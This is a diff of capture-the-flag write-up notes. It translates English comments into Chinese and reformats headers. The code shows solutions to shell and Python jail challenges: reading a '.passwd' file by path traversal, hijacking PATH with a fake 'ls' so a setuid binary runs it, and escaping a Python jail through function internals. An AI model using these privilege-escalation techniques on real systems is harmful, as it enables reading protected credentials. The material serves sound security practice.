@@ -26,11 +26,12 @@ cat /challenge/app-script/ch1/notes/../ch1craked/.passwd
 ````
 ---
 # 3.Bash - System 2
+与第一题方式相同
 ````bash
-same as the first problem
 cp /bin/nano /tmp/tmp1/ls
-
-Another way:
+````
+另一种方式：
+````bash
 nano ls.c
 #include <stdlib.h>
 #include <stdio.h>
@@ -42,8 +43,9 @@ int main(int argc, char  *argv[]){
 gcc ls.c -o ls
 export PATH=/tmp/pwnd1:$PATH
 ~/ch12
-
-And another way:
+````
+第三种方式：
+````bash
 nano ls
 cat $2
 chmod +x ./ls
@@ -175,11 +177,11 @@ builtin	__doc__	documentation string
  	__self__	instance to which a method is bound, or None
 ````
 ---
-10.Bash/Awk - netstat parsing
+# 10.Bash/Awk - netstat parsing
 ---
-11.PHP - Jail
+# 11.PHP - Jail
 ---
-12.Python - PyJail 2
+# 12.Python - PyJail 2
 ````python
 print dir(getout)
 ['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name'] 
@@ -197,13 +199,13 @@ print list(getattr(getout,dir(getout)[-2]))[-7]
 print getout(getattr(getout,dir(getout)[-2])[list(getattr(getout,dir(getout)[-2]))[-7]])
 ````
 ---
-13.Python - Jail - Exec
+# 13.Python - Jail - Exec
 ---
-14.Javascript - Jail
+# 14.Javascript - Jail
 ---
-15.Python - Jail - Garbage collector
+# 15.Python - Jail - Garbage collector
 ---
-16.Bash - Restricted shells
+# 16.Bash - Restricted shells
 ---
 
 
